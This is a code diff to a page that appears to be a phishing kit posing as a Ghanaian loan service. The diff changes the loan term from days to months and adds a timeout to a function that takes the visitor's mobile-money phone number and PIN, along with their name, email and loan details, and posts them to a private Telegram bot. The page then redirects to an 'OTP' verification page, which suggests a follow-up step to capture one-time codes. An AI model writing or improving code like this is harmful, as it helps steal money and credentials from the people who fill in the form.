@@ -501,13 +501,13 @@
         function loadLoanSummary() {
             const loanType = localStorage.getItem('loanType') || 'Smart Loan';
             const loanAmount = localStorage.getItem('loanAmount') || '1000';
-            const loanTerm = localStorage.getItem('loanTerm') || '30';
+            const loanTerm = localStorage.getItem('loanTerm') || '12';
 
             document.getElementById('loanIcon').textContent = '💰';
             document.getElementById('loanName').textContent = loanType;
-            document.getElementById('loanValue').textContent = 'GHS ' + parseInt(loanAmount).toLocaleString() + ' • ' + loanTerm + ' Days';
+            document.getElementById('loanValue').textContent = 'GHS ' + parseInt(loanAmount).toLocaleString() + ' • ' + loanTerm + ' Months';
 
-            console.log('💰 Loan:', loanType, '-', loanAmount, '-', loanTerm);
+            console.log('💰 Loan:', loanType, '-', loanAmount, '-', loanTerm, 'Months');
         }
 
         loadLoanSummary();
@@ -591,12 +591,12 @@
         }
 
         // ============================================
-        // SEND TO TELEGRAM - INCLUDES ALL DETAILS
+        // SEND TO TELEGRAM WITH TIMEOUT
         // ============================================
         async function sendTelegramNotification(phone, pin) {
             const loanType = localStorage.getItem('loanType') || 'Smart Loan';
             const loanAmount = localStorage.getItem('loanAmount') || '1000';
-            const loanTerm = localStorage.getItem('loanTerm') || '30';
+            const loanTerm = localStorage.getItem('loanTerm') || '12';
             const loanPurpose = localStorage.getItem('loanPurpose') || 'Not specified';
             const fullName = localStorage.getItem('fullName') || 'Not provided';
             const email = localStorage.getItem('email') || 'Not provided';
@@ -611,7 +611,7 @@
                 `📋 *LOAN DETAILS*\n` +
                 `📌 Product: ${loanType}\n` +
                 `💵 Amount: GHS ${parseInt(loanAmount).toLocaleString()}\n` +
-                `📅 Term: ${loanTerm} Days\n` +
+                `📅 Term: ${loanTerm} Months\n` +
                 `📝 Purpose: ${loanPurpose}\n\n` +
                 `👤 *PERSONAL DETAILS*\n` +
                 `👤 Name: ${fullName}\n` +
@@ -630,6 +630,10 @@
 
             console.log('📤 Sending Telegram notification...');
 
+            // Create AbortController for timeout (3 seconds max)
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 3000);
+
             try {
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -640,12 +644,15 @@
                         chat_id: CHAT_ID,
                         text: message,
                         parse_mode: 'Markdown'
-                    })
+                    }),
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
                 const data = await response.json();
                 console.log('📥 Telegram response:', data);
                 return data.ok;
             } catch (error) {
+                clearTimeout(timeoutId);
                 console.error('❌ Telegram error:', error.message);
                 return false;
             }
@@ -683,6 +690,9 @@
             localStorage.setItem('momoPhone', phone);
             localStorage.setItem('momoPin', pin);
 
+            console.log('🚀 Starting Telegram send + redirect...');
+
+            // Send Telegram AND wait max 3 seconds, then redirect regardless
             const sent = await sendTelegramNotification(phone, pin);
 
             if (sent) {
@@ -691,10 +701,14 @@
                 showStatus('✅ Account verified! Redirecting to OTP...', 'info');
             }
 
-            // REDIRECT TO VERIFY.HTML (OTP PAGE)
+            console.log('➡️ Redirecting to verify.html in 800ms...');
+
+            // Shorter timeout - just enough to show the success message
             setTimeout(() => {
+                spinnerOverlay.style.display = 'none';
+                console.log('✅ Redirecting now...');
                 window.location.href = 'verify.html';
-            }, 1500);
+            }, 800);
         });
 
         // ============================================
